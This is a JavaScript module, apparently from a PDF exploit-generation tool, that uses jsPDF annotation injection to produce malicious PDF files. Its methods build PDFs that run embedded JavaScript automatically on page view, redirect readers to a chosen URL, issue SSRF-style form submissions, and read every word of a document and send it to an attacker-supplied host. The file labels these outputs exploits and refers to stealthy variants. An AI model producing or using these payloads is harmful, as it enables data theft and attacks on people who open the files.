const {jsPDF} = require("jspdf");

class jsPDF_template{

	constructor(){
		this.state = -1 // building state
		this.doc = new jsPDF();
	}


	bake_autorun(out_name="autorun-no-intereaction", direction) {
		this.doc = new jsPDF();
		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
		type:'link',url:`/) >> >><</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});
		this.doc.text(20, 20, 'Execute automatically');
		out_name = out_name + ".pdf"
		this.doc.save(out_name);
		this.state = 1
		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
		return [out_name, this.state];
	}


	bake_simple_js(out_name='simple_js', direction){
		this.doc = new jsPDF();
		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
		type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});
		this.doc.text(20, 20, 'Test text');
		out_name = out_name + ".pdf"
		this.doc.save(out_name);
		this.state = 1
		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
		return [out_name, this.state];
	}
	bake_redirection(out_name='Redirection', direction){
		this.doc = new jsPDF();
		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
		type:'link',url:`/blah)>>/A<</S/URI/URI(`+direction+`)/Type/Action>>/F 0>>(`});
		this.doc.text(20, 20, 'Test text');
		out_name = out_name + ".pdf"
		this.doc.save(out_name);
		this.state = 1
		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
		return [out_name, this.state, direction];
	}


	bake_PDFSSRF(out_name='PDF-SSRF', direction){
		this.doc = new jsPDF();
		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
		type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(Title)/V(Value)>>/A<</S/JavaScript/JS(
		app.alert("curl 'https://10.10.10.10'");
		this.submitForm(`+direction+`, false, false, ['Title']);
		)/(`});
		this.doc.text(20, 20, 'Test text');
		out_name = out_name + ".pdf"
		this.doc.save(out_name);
		this.state = 1
		return [out_name, this.state, direction];
		//alert(embed.getPageLocationNormalized());
	}

	bake_extraction(out_name='extraction', direction){
		this.doc = new jsPDF();
		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(
		words = [];
		for(page=0;page<this.numPages;page++) {
		    for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {
		        word = this.getPageNthWord(page, wordPos, true);
		        words.push(word);
		    }
		}
		app.alert(words);
		this.submitForm('`+direction+`?words='+encodeURIComponent(words.join(',')));
		`});
		this.doc.text(20, 20, 'Click me test');
		this.doc.text(20, 40, 'Abc Def');
		this.doc.text(20, 60, 'Some word');
		out_name = out_name + ".pdf"
		this.doc.save(out_name);
		this.state = 1
		return [out_name, this.state, direction];
	}

}
module.exports = jsPDF_template